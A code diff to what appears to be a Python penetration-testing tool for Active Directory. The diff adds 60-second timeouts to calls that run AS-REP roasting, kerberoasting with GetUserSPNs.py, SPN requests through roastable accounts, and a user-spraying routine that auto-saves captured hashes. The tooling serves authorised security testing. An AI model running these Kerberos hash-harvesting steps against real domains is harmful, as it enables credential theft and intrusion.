@@ -75,6 +75,7 @@ def request_spns_with_asrep_roastable_users(output: str, domain: str, fqdn: str,
             _get_user_spns_no_preauth_args(domain, fqdn, users_file, roastable_user),
             f"Request SPNs without authentication using AS-REP roastable account {roastable_user}",
             capture_output=True,
+            timeout=60,
         )
         if spn_output:
             combined_output.append(spn_output)
@@ -243,6 +244,7 @@ def user_spraying(
                     _get_np_users_args(d, r, users_file, kerberos=k),
                     "Find users with Kerberos pre-auth disabled",
                     capture_output=True,
+                    timeout=60,
                 )
 
                 # Auto-save AS-REP hashes
@@ -270,6 +272,7 @@ def user_spraying(
         _get_np_users_args(d, r, users_file),
         "Find users with Kerberos pre-auth disabled",
         capture_output=True,
+        timeout=60,
     )
 
     # Auto-save AS-REP hashes
@@ -313,7 +316,7 @@ def kerberoasting(r: str, f: str, d: str, u: str, p: str, k: bool) -> bool:
     base_cmd = ["GetUserSPNs.py", f"{d}/{u}:{p}", "-request", "-dc-host", dc_host_name] + kerberos_auth
 
     # Run the command and capture ALL output (stdout + stderr)
-    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True)
+    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True, timeout=60)
 
     NTLM_FAILED = "NTLM negotiation failed"
     INVALID_CREDENTIALS = "invalidCredentials"
